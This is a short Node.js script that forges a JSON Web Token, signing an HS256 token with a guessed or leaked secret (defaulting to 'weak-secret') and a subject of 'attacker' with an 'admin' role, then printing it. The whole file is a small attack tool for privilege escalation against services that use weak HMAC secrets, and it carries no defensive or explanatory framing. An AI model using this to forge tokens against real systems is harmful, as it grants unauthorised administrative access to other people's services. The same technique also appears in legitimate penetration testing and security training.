
const jwt = require('jsonwebtoken');
const secret = process.argv[2] || 'weak-secret';
const role = process.argv[3] || 'admin';
const token = jwt.sign({ sub: 'attacker', role }, secret, { algorithm: 'HS256', expiresIn: '1h' });
console.log(token);


